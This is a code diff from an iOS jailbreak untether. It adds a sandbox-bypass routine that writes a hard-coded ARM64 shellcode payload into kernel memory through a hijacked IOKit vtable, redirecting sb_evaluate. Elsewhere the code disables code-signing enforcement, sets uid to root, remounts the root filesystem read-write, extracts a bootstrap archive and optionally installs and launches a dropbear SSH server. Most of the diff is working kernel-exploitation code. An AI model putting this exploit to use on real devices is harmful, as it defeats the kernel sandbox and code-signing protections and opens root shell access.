@@ -843,6 +843,10 @@ struct PatchFinder
 	uint64_t MAPIO					= 0x0;
 	uint64_t SB_TRACE				= 0x0;
 	//
+	uint64_t SB_EVALUATE_HOOK		= 0x0;
+	uint64_t SB_EVALUATE				= 0x0;
+	uint64_t VN_GETPATH				= 0x0;
+	//
 	uint64_t KERNEL_PMAP			= 0x0;
 	uint64_t PHYS_ADDR				= 0x0;
 	
@@ -895,6 +899,10 @@ struct PatchFinder
 		MAPIO					= m_kernelBase + m_kaslrSlide + 0xFBDEEC;
 		SB_TRACE				= m_kernelBase + m_kaslrSlide + 0xCC1750;
 		//
+		SB_EVALUATE_HOOK		= m_kernelBase + m_kaslrSlide + 0x001000;
+		SB_EVALUATE				= m_kernelBase + m_kaslrSlide + 0xCBDD24;
+		VN_GETPATH				= m_kernelBase + m_kaslrSlide + 0x10978C;
+		//
 		KERNEL_PMAP				= m_kernelBase + m_kaslrSlide + 0x4AA138;
 		PHYS_ADDR				= m_kernelBase + m_kaslrSlide + 0x540040;
 
@@ -925,8 +933,88 @@ struct PatchFinder
 		UTZLog(@"[INF:PTF] MAPIO                  = 0x%.16llX", MAPIO);
 		UTZLog(@"[INF:PTF] SB_TRACE               = 0x%.16llX", SB_TRACE);
 
+		UTZLog(@"[INF:PTF] SB_EVALUATE_HOOK       = 0x%.16llX", SB_EVALUATE_HOOK);
+		UTZLog(@"[INF:PTF] SB_EVALUATE            = 0x%.16llX", SB_EVALUATE);
+		UTZLog(@"[INF:PTF] VN_GETPATH             = 0x%.16llX", VN_GETPATH);
+		
 		UTZLog(@"[INF:PTF] KERNEL_PMA             = 0x%.16llX", KERNEL_PMAP);
 		UTZLog(@"[INF:PTF] PHYS_ADDR              = 0x%.16llX", PHYS_ADDR);
+	}
+	
+	template<typename Functor>
+	void patchSandbox(Functor writeWhatWhere32)
+	{
+		// Extracted from Taig 8.4 jailbreak (thanks @in7egral)
+		uint8_t payload[0x190] = {
+			0xFD, 0x7B, 0xBF, 0xA9, 0xFD, 0x03, 0x00, 0x91, 0xF4, 0x4F, 0xBF, 0xA9, 0xF6, 0x57, 0xBF, 0xA9,
+			0xFF, 0x43, 0x10, 0xD1, 0xF3, 0x03, 0x00, 0xAA, 0xF4, 0x03, 0x01, 0xAA, 0xF5, 0x03, 0x02, 0xAA,
+			0xF6, 0x03, 0x03, 0xAA, 0xC0, 0x26, 0x40, 0xF9, 0x1F, 0x04, 0x00, 0xF1, 0x41, 0x04, 0x00, 0x54,
+			0xC0, 0x2A, 0x40, 0xF9, 0x00, 0x04, 0x00, 0xB4, 0x1F, 0x20, 0x03, 0xD5, 0xE1, 0x03, 0x00, 0x91,
+			0xE2, 0x03, 0x10, 0x91, 0x03, 0x80, 0x80, 0xD2, 0x43, 0x00, 0x00, 0xF9, 0x11, 0x11, 0x11, 0x11,
+			0xE3, 0x03, 0x16, 0xAA, 0x00, 0x03, 0x00, 0xB5, 0xE0, 0x03, 0x00, 0x91, 0x81, 0x05, 0x00, 0x10,
+			0x1E, 0x00, 0x00, 0x94, 0x80, 0x02, 0x00, 0xB4, 0xE0, 0x03, 0x00, 0x91, 0x81, 0x05, 0x00, 0x30,
+			0x1A, 0x00, 0x00, 0x94, 0x20, 0x01, 0x00, 0xB5, 0xE0, 0x03, 0x00, 0x91, 0xA1, 0x05, 0x00, 0x30,
+			0x16, 0x00, 0x00, 0x94, 0x80, 0x01, 0x00, 0xB4, 0xE0, 0x03, 0x00, 0x91, 0xA1, 0x06, 0x00, 0x70,
+			0x12, 0x00, 0x00, 0x94, 0x00, 0x01, 0x00, 0xB5, 0x00, 0x03, 0x80, 0xD2, 0x00, 0x7C, 0x60, 0xD3,
+			0xFF, 0x43, 0x10, 0x91, 0xF6, 0x57, 0xC1, 0xA8, 0xF4, 0x4F, 0xC1, 0xA8, 0xFD, 0x7B, 0xC1, 0xA8,
+			0xC0, 0x03, 0x5F, 0xD6, 0xE0, 0x03, 0x13, 0xAA, 0xE1, 0x03, 0x14, 0xAA, 0xE2, 0x03, 0x15, 0xAA,
+			0xFF, 0x43, 0x10, 0x91, 0xF6, 0x57, 0xC1, 0xA8, 0xF4, 0x4F, 0xC1, 0xA8, 0xFD, 0x7B, 0xC1, 0xA8,
+			0xCC, 0xCC, 0xCC, 0xCC, 0xDD, 0xDD, 0xDD, 0xDD, 0x04, 0x00, 0x40, 0x39, 0x25, 0x00, 0x40, 0x39,
+			0x25, 0x01, 0x00, 0x34, 0x9F, 0x00, 0x05, 0x6B, 0xA1, 0x00, 0x00, 0x54, 0xC4, 0x00, 0x00, 0x34,
+			0x00, 0x04, 0x00, 0x91, 0x21, 0x04, 0x00, 0x91, 0xF8, 0xFF, 0xFF, 0x17, 0x20, 0x00, 0x80, 0x52,
+			0xC0, 0x03, 0x5F, 0xD6, 0x00, 0x00, 0x80, 0x52, 0xC0, 0x03, 0x5F, 0xD6, 0x2F, 0x70, 0x72, 0x69,
+			0x76, 0x61, 0x74, 0x65, 0x2F, 0x76, 0x61, 0x72, 0x2F, 0x74, 0x6D, 0x70, 0x00, 0x2F, 0x70, 0x72,
+			0x69, 0x76, 0x61, 0x74, 0x65, 0x2F, 0x76, 0x61, 0x72, 0x2F, 0x6D, 0x6F, 0x62, 0x69, 0x6C, 0x65,
+			0x00, 0x2F, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x2F, 0x76, 0x61, 0x72, 0x2F, 0x6D, 0x6F,
+			0x62, 0x69, 0x6C, 0x65, 0x2F, 0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x2F, 0x50, 0x72, 0x65,
+			0x66, 0x65, 0x72, 0x65, 0x6E, 0x63, 0x65, 0x73, 0x2F, 0x63, 0x6F, 0x6D, 0x2E, 0x61, 0x70, 0x70,
+			0x6C, 0x65, 0x00, 0x2F, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x2F, 0x76, 0x61, 0x72, 0x2F,
+			0x6D, 0x6F, 0x62, 0x69, 0x6C, 0x65, 0x2F, 0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x2F, 0x50,
+			0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6E, 0x63, 0x65, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+		};
+		
+		uint32_t sb_evaluate_hook_offset = SB_EVALUATE_HOOK - m_kernelBase - m_kaslrSlide;
+		uint32_t sb_evaluate_offset = SB_EVALUATE - m_kernelBase - m_kaslrSlide;
+		uint32_t vn_getpath_offset = VN_GETPATH - m_kernelBase - m_kaslrSlide;
+		
+		uint32_t vn_getpath_for_arm_assembling = vn_getpath_offset + 0xFFFF000;
+		uint32_t sb_evaluate_for_arm_assembling = sb_evaluate_offset + 0xFFFF004;
+		
+		uint32_t *payloadAsUint32 = (uint32_t *)payload;
+		uint32_t patchValue;
+		
+		for ( uint32_t i = 0; i < 0x190; ++i )
+		{
+			uint32_t dataOffset = payloadAsUint32[i];
+			switch ( dataOffset )
+			{
+				case 0xCCCCCCCC:
+					patchValue = 0xA9BA6FFC; // stolen bytes from sb_evaluate (kernel 8.4.1)
+					payloadAsUint32[i] = patchValue;
+					break;
+				case 0xDDDDDDDD:
+					patchValue = (sb_evaluate_for_arm_assembling >> 2) & 0x3FFFFFF | 0x14000000;
+					payloadAsUint32[i] = patchValue;
+					break;
+				case 0x11111111:
+					patchValue = (vn_getpath_for_arm_assembling >> 2) & 0x3FFFFFF | 0x94000000;
+					payloadAsUint32[i] = patchValue;
+					break;
+			}
+			vn_getpath_for_arm_assembling -= 4;
+			sb_evaluate_for_arm_assembling -= 4;
+		}
+		sync();
+		uint64_t offset = SB_EVALUATE_HOOK;
+		uint32_t count = sizeof(payload) / sizeof(uint32_t);
+		for(uint32_t i=0; i < count; ++i)
+		{
+			writeWhatWhere32(payloadAsUint32[i], offset);
+			offset += sizeof(uint32_t);
+		}
+			
+		uint32_t branch_instr = (sb_evaluate_hook_offset - sb_evaluate_offset) >> 2 & 0x3FFFFFF | 0x14000000;
+		writeWhatWhere32(branch_instr, SB_EVALUATE);
 	}
 };
 
@@ -1045,6 +1133,181 @@ bail:
 	
 	return goodFound;
 }
+
+#pragma mark -
+#pragma mark SetupPersistence
+
+#if defined(UNTETHER_FULL)
+
+bool SetupPersistence()
+{
+	return false;
+}
+
+#endif
+
+#pragma mark -
+#pragma mark InstallBootstrap
+
+bool InstallBootstrap()
+{
+	int f;
+	
+	// bail if bootstap is already installed
+	struct stat sb;
+	if (stat("/.cydia_no_stash", &sb) == 0)
+	{
+		UTZLog(@"[ERR:BST] Looks like bootstrap is already installed.");
+		return true;
+	}
+
+	if (stat("/var/mobile/Media/PhotoData/KimJongCracks/bootstrap.tar", &sb) != 0)
+	{
+		UTZLog(@"[ERR:BST] Unable to find bootstrap.tar");
+		return false;
+	}
+	
+	UTZLog(@"[INF:BST] Beginning extraction.");
+	
+	chmod("/var/mobile/Media/PhotoData/KimJongCracks/tar", 0777);
+
+	chdir("/");
+
+	// extract bootstrap.tar
+	f = fork();
+	if (f == 0) {
+		execl("/var/mobile/Media/PhotoData/KimJongCracks/tar", "tar", "pxvf", "/var/mobile/Media/PhotoData/KimJongCracks/bootstrap.tar", 0);
+		UTZLog(@"[INF:BST]  ...done.");
+		exit(0);
+	}
+	waitpid(f, 0, 0);
+
+	// remove patcyh
+	UTZLog(@"[INF:BST] Remove /private/var/lib/dpkg/info/com.saurik.patcyh.*");
+	f = fork();
+	if (f == 0) {
+		remove("/private/var/lib/dpkg/info/com.saurik.patcyh.extrainst_");
+		remove("/private/var/lib/dpkg/info/com.saurik.patcyh.list");
+		remove("/private/var/lib/dpkg/info/com.saurik.patcyh.postrm");
+		UTZLog(@"[INF:BST]  ...done.");
+		exit(0);
+	}
+	waitpid(f, 0, 0);
+
+	// create empty /.cydia_no_stash file
+	fclose(fopen("/.cydia_no_stash", "w+"));
+	
+	// wait a bit
+	usleep(100 * 1000);
+	
+	// flush uicache
+	f = fork();
+	if (f == 0) {
+		setreuid(501,501);
+		execl("/usr/bin/uicache", "uicache", 0);
+		exit(0);
+	}
+	waitpid(f, 0, 0);
+	
+	UTZLog(@"[INF:BST] Done installing bootstrap.");
+	
+	return true;
+}
+
+#ifdef DROPBEAR
+#pragma mark -
+#pragma mark InstallDropbear
+
+bool CopyFile(const char *src_path, const char *dst_path)
+{
+	int inFile = open(src_path, O_RDONLY);
+	if ( inFile == -1 )
+	{
+		UTZLog(@"[ERR:UTL] CopyFile: unable to open for read %s", src_path);
+		return false;
+	}
+	
+	int outFile = open(dst_path, O_RDWR|O_CREAT|O_TRUNC);
+	if ( outFile == -1 )
+	{
+		UTZLog(@"[ERR:UTL] CopyFile: unable to open for write %s", dst_path);
+		return false;
+	}
+
+	int res = fcopyfile(inFile, outFile, 0, COPYFILE_ALL);
+	if ( res == -1 )
+	{
+		UTZLog(@"[ERR:UTL] CopyFile: unable to copy %s", src_path);
+		return false;
+	}
+}
+
+bool InstallDropbear()
+{
+	int f;
+	pid_t dropbear_pid;
+
+	UTZLog(@"[INF:DBR] Copy dropbear...");
+	CopyFile("/var/mobile/Media/PhotoData/KimJongCracks/dropbear", "/usr/bin/dropbear");
+
+	UTZLog(@"[INF:DBR] Fix permissions...");
+	chmod("/usr/bin/dropbear", 0777);
+	chmod("/var/mobile/Media/PhotoData/KimJongCracks/dropbearkey", 0777);
+
+	mkdir("/etc/dropbear", 0755);
+	
+#if 0 // if you need RSA
+	UTZLog(@"[INF:DBR] Generate RSA...");
+	f = fork();
+	if (f == 0) {
+		execl("/var/mobile/Media/PhotoData/KimJongCracks/dropbearkey", "dropbearkey", "-t", "rsa", "-f", "/etc/dropbear/dropbear_rsa_host_key", 0);
+		UTZLog(@"[INF:DBR]  ...done.");
+		exit(0);
+	}
+	waitpid(f, 0, 0);
+#endif
+
+#if 0 // if you need DSS
+	UTZLog(@"[INF:DBR] Generate DSS...");
+	f = fork();
+	if (f == 0) {
+		execl("/var/mobile/Media/PhotoData/KimJongCracks/dropbearkey", "dropbearkey", "-t", "dsa", "-f", "/etc/dropbear/dropbear_dss_host_key", 0);
+		UTZLog(@"[INF:DBR]  ...done.");
+		exit(0);
+	}
+	waitpid(f, 0, 0);
+#endif
+
+#if 1 // if you need ECDSA
+	UTZLog(@"[INF:DBR] Generate ECDSA...");
+	f = fork();
+	if (f == 0) {
+		execl("/var/mobile/Media/PhotoData/KimJongCracks/dropbearkey", "dropbearkey", "-t", "ecdsa", "-f", "/etc/dropbear/dropbear_ecdsa_host_key", 0);
+		UTZLog(@"[INF:DBR]  ...done.");
+		exit(0);
+	}
+	waitpid(f, 0, 0);
+#endif
+
+	char* dropbear_path = "/usr/bin/dropbear";
+	char *dropbear_argv[] = {
+		dropbear_path,
+		nullptr
+	};
+	
+	UTZLog(@"[INF:DBR] Spawn dropbear...");
+	int status = posix_spawn(&dropbear_pid, dropbear_path, nullptr, nullptr, dropbear_argv, environ);
+	if (status == 0)
+	{
+		UTZLog(@"[INF:DBR] ... done (PID = %d)", dropbear_pid);
+	}
+	else
+	{
+		UTZLog(@"[INF:DBR] posix_spawn(\"%s\") failed: %s (%d)", dropbear_argv[0], strerror(status), status);
+	}
+}
+
+#endif
 
 #pragma mark -
 #pragma mark main
@@ -1234,41 +1497,55 @@ int main(int argc, char** argv)
 
 	#if defined(UNTETHER_FULL)
 		
-		#define WriteWhatWhere32(what, where) { \
-			vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.STR_W3_X1_W2_UXTW; \
-			kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize); \
-			ggService512.callIndex0Trap5((uint64_t)where, 0x0, (uint32_t)what, 0x4444444444444444, 0x4545454545454545); \
-		} \
+		auto WriteWhatWhere32 = [&] (uint32_t what, uint64_t where) {
+			vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.STR_W3_X1_W2_UXTW;
+			kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
+			ggService512.callIndex0Trap5((uint64_t)where, 0x0, (uint32_t)what, 0x4444444444444444, 0x4545454545454545);
+		};
 
-		#define ReadWhere32(where, out) { \
-			vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.LDR_X0_X1_32; \
-			kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize); \
-			out = ggService512.callIndex0Trap5((uint64_t)where - 32, 0x4242424242424242, 0x4343434343434343, 0x4444444444444444, 0x4545454545454545); \
-		} \
+		auto ReadWhere32 = [&] (uint64_t where, uint32_t& output) {
+			vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.LDR_X0_X1_32;
+			kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
+			output = ggService512.callIndex0Trap5((uint64_t)where - 32, 0x4242424242424242, 0x4343434343434343, 0x4444444444444444, 0x4545454545454545);
+		};
 
-		#define ReadWhere64(where, out) { \
-			vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.LDR_X0_X1_32; \
-			kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize); \
-			uint32_t* tmp_hi_lo = (uint32_t*)&out; \
-			tmp_hi_lo[0] = ggService512.callIndex0Trap5((uint64_t)where - 32, 0x4242424242424242, 0x4343434343434343, 0x4444444444444444, 0x4545454545454545); \
-			tmp_hi_lo[1] = ggService512.callIndex0Trap5((uint64_t)where + 4 - 32, 0x4242424242424242, 0x4343434343434343, 0x4444444444444444, 0x4545454545454545); \
-		} \
+		auto ReadWhere64 = [&] (uint64_t where, uint64_t& output) {
+			vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.LDR_X0_X1_32;
+			kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
+			uint32_t* tmp_hi_lo = (uint32_t*)&output;
+			tmp_hi_lo[0] = ggService512.callIndex0Trap5((uint64_t)where - 32, 0x4242424242424242, 0x4343434343434343, 0x4444444444444444, 0x4545454545454545);
+			tmp_hi_lo[1] = ggService512.callIndex0Trap5((uint64_t)where + 4 - 32, 0x4242424242424242, 0x4343434343434343, 0x4444444444444444, 0x4545454545454545);
+		};
+
+		auto InvalidateTLB = [&] () {
+			vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.INVALIDATE_TLB;
+			kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
+			ggService512.callIndex0Trap1(0);
+		};
+
+		auto FlushCache = [&] () {
+			vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.FLUSHCACHE;
+			kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
+			ggService512.callIndex0Trap1(0);
+		};
 
 		uint64_t pages[50];
 
 		int page_cnt = 0;
-		pages[page_cnt++] = patchFinder.GET_R00T		& (~0xFFF); // 0
-		pages[page_cnt++] = patchFinder.VM_MAP_ENTER	& (~0xFFF); // 1
-		pages[page_cnt++] = patchFinder.VM_MAP_PROTECT	& (~0xFFF); // 2
-		pages[page_cnt++] = patchFinder.MOUNT_COMMON	& (~0xFFF); // 3
-		pages[page_cnt++] = patchFinder.TFP0			& (~0xFFF); // 4
-		pages[page_cnt++] = patchFinder.CS_ENFORCE		& (~0xFFF); // 5
-		pages[page_cnt++] = patchFinder.PROC_ENFORCE	& (~0xFFF); // 6
-		pages[page_cnt++] = patchFinder.ICHDB_1			& (~0xFFF); // 7
-		pages[page_cnt++] = patchFinder.ICHDB_2			& (~0xFFF); // 8
-		pages[page_cnt++] = patchFinder.MAPIO			& (~0xFFF); // 9
-		pages[page_cnt++] = patchFinder.SB_TRACE		& (~0xFFF); // 10
-
+		pages[page_cnt++] = patchFinder.GET_R00T			& (~0xFFF); // 0
+		pages[page_cnt++] = patchFinder.VM_MAP_ENTER		& (~0xFFF); // 1
+		pages[page_cnt++] = patchFinder.VM_MAP_PROTECT		& (~0xFFF); // 2
+		pages[page_cnt++] = patchFinder.MOUNT_COMMON		& (~0xFFF); // 3
+		pages[page_cnt++] = patchFinder.TFP0				& (~0xFFF); // 4
+		pages[page_cnt++] = patchFinder.CS_ENFORCE			& (~0xFFF); // 5
+		pages[page_cnt++] = patchFinder.PROC_ENFORCE		& (~0xFFF); // 6
+		pages[page_cnt++] = patchFinder.ICHDB_1				& (~0xFFF); // 7
+		pages[page_cnt++] = patchFinder.ICHDB_2				& (~0xFFF); // 8
+		pages[page_cnt++] = patchFinder.MAPIO				& (~0xFFF); // 9
+		pages[page_cnt++] = patchFinder.SB_TRACE			& (~0xFFF); // 10
+		pages[page_cnt++] = patchFinder.SB_EVALUATE_HOOK	& (~0xFFF); // 11
+		pages[page_cnt++] = patchFinder.SB_EVALUATE			& (~0xFFF); // 12
+		
 		// work with memory pages
 		// get PDE
 		uint64_t pmap_store, pde_base;
@@ -1349,7 +1626,7 @@ int main(int argc, char** argv)
 			if ((level2_entry & kPageDescriptorType_Mask) != kPageDescriptorType_Table)
 			{
 				if ((level2_entry & kPageDescriptorType_Mask) != kPageDescriptorType_Block) {
-					NSLog(@"[ERR:UTZ] pages[%2d:%.16llX] -> L1[%2d:%.16llX] invalid L2 entry found", i, rw_page_base, idx, level2_entry);
+					UTZLog(@"[ERR:UTZ] pages[%2d:%.16llX] -> L1[%2d:%.16llX] invalid L2 entry found", i, rw_page_base, idx, level2_entry);
 					continue;
 				}
 
@@ -1421,15 +1698,9 @@ int main(int argc, char** argv)
 			}
 		}
 		
-		// Invalidate TLB
-		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.INVALIDATE_TLB;
-		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
-		ggService512.callIndex0Trap1(0);
+		InvalidateTLB();
 		
-		// Flush cache
-		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.FLUSHCACHE;
-		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
-		ggService512.callIndex0Trap1(0);
+		FlushCache();
 		
 		uint32_t kv = 0;
 		
@@ -1450,6 +1721,12 @@ int main(int argc, char** argv)
 		WriteWhatWhere32(0x1, patchFinder.ICHDB_1);
 		WriteWhatWhere32(0x1, patchFinder.ICHDB_2);
 		WriteWhatWhere32(0x0, patchFinder.PROC_ENFORCE);
+		patchFinder.patchSandbox(
+			[&] (uint32_t data, uint64_t offset) mutable
+			{
+				WriteWhatWhere32(data, offset);
+			}
+		);
 		UTZLog(@"[INF:UTZ] ... done");
 		
 		ReadWhere32(patchFinder.VM_MAP_ENTER, kv);
@@ -1457,10 +1734,7 @@ int main(int argc, char** argv)
 		ReadWhere32(patchFinder.TFP0, kv);
 		UTZLog(@"[INF:UTZ] kv: 0x%016llx", kv);
 		
-		// Flush cache
-		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.FLUSHCACHE;
-		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
-		ggService512.callIndex0Trap1(0);
+		FlushCache();
 
 		UTZLog(@"[INF:UTZ] revert patched page descriptors (%d)", pages_patch_cnt);
 		for (uint32_t i=0; i < pages_patch_cnt ; i--)
@@ -1470,22 +1744,16 @@ int main(int argc, char** argv)
 			UTZLog(@"[INF:UTZ] L3[0x%.16llX] revert to %.16llX", pages_patches[i].address, pages_patches[i].data);
 		}
 		
-		// Invalidate TLB
-		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.INVALIDATE_TLB;
-		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
-		ggService512.callIndex0Trap1(0);
+		InvalidateTLB();
 
-		// Flush cache
-		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.FLUSHCACHE;
-		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
-		ggService512.callIndex0Trap1(0);
+		FlushCache();
 
-		NSLog(@"[INF:UTZ] uid: %d", getuid());
+		UTZLog(@"[INF:UTZ] uid: %d", getuid());
 		
 		setreuid(0, 0);
 		setuid(0);
 		
-		NSLog(@"[INF:UTZ] uid: %d", getuid());
+		UTZLog(@"[INF:UTZ] uid: %d", getuid());
 		
 		// revert vtable pointer
 		memcpy(&vtdump[childOffset], &child[0], kTargetZoneOriginal);
@@ -1523,13 +1791,15 @@ bail:
 #if defined(UNTETHER_AMFI)
 	if (success)
 	{
+		char* utz_path = "/var/mobile/Media/untether64";
+		
 		pid_t untether_pid;
 		char *untether_argv[] = {
-			"/var/mobile/Media/untether64",
+			utz_path,
 			nullptr
 		};
 		
-		int ret = chmod("/var/mobile/Media/untether64", 755);
+		int ret = chmod(utz_path, 755);
 		if(ret == 0)
 		{
 			UTZLog(@"[INF:UTA] chmod untether64...");
@@ -1540,7 +1810,7 @@ bail:
 		}
 		
 		UTZLog(@"[INF:UTA] spawn untether64...");
-		int status = posix_spawn(&untether_pid, "/var/mobile/Media/untether64", nullptr, nullptr, untether_argv, environ);
+		int status = posix_spawn(&untether_pid, utz_path, nullptr, nullptr, untether_argv, environ);
 		if (status == 0)
 		{
 			UTZLog(@"[INF:UTA] ... done. Wait for %d", untether_pid);
@@ -1566,55 +1836,19 @@ bail:
 		char* nm = strdup("/dev/disk0s1s1");
 		int mntr = mount("hfs", "/", 0x10000, &nm);
 		
-		UTZLog(@"[INF:UTZ] Remounting / as read/write %d %s", mntr, strerror(errno));
-		struct stat sb;
-		if (stat("/yalu", &sb) != 0) {
-			UTZLog(@"[INF:UTZ] /yalu not found, dropping myself..");
-			char name[1024];
-			uint32_t sz = 1024;
-			_NSGetExecutablePath(&name[0], &sz);
-			int o = open(name, O_RDONLY);
-			int f = open("/yalu", O_RDWR|O_CREAT|O_TRUNC);
-			int r = fcopyfile(o, f, 0, COPYFILE_ALL);
-			UTZLog(@"[INF:UTZ] %d %d %d", o, f, r);
-			if (stat("/var/mobile/Media/PhotoData/KimJongCracks/bootstrap.tar", &sb) == 0) {
-				chmod("/var/mobile/Media/PhotoData/KimJongCracks/tar", 0777);
-				
-				UTZLog(@"[INF:UTZ] Installing loader.");
-				chdir("/");
-				
-				UTZLog(@"[INF:UTZ] Beginning extraction.");
-				int f = fork();
-				if (f == 0) {
-					execl("/var/mobile/Media/PhotoData/KimJongCracks/tar", "tar", "xvf", "/var/mobile/Media/PhotoData/KimJongCracks/bootstrap.tar", 0);
-					exit(0);
-				}
-				waitpid(f, 0, 0);
-				
-				UTZLog(@"[INF:UTZ] Done extracting.");
-				/*
-				 this fucks shit up without an untether
-				 f = fork();
-				 if (f == 0) {
-				 execl("/var/lib/dpkg/info/com.saurik.patcyh.extrainst_", "/var/lib/dpkg/info/com.saurik.patcyh.extrainst_", "install", 0);
-				 exit(0);
-				 }
-				 waitpid(f, 0, 0);
-				 */
-				f = fork();
-				if (f == 0) {
-					setreuid(501,501);
-					execl("/usr/bin/uicache", "uicache", 0);
-					exit(0);
-				}
-				waitpid(f, 0, 0);
-				UTZLog(@"[INF:UTZ] Done installing loader.");
-				
-				unlink("/var/mobile/Media/PhotoData/KimJongCracks/bootstrap.tar");
-				kill(pp, 9);
-			}
-		}
+		UTZLog(@"[INF:UTZ] Remounting / as read/write %d (%s)", mntr, (mntr != 0)? strerror(errno) : "done");
 		
+		//UTZLog(@"[INF:UTZ] Setting up for persistence...");
+		//SetupPersistence();
+		
+		UTZLog(@"[INF:UTZ] Installing bootstrap...");
+		InstallBootstrap();
+
+	#ifdef DROPBEAR
+		UTZLog(@"[INF:UTZ] Installing dropbear...");
+		InstallDropbear();
+	#endif
+
 		UTZLog(@"[INF:UTZ] ALL YOUR BASE ARE BELONG TO US");
 	}
 #endif
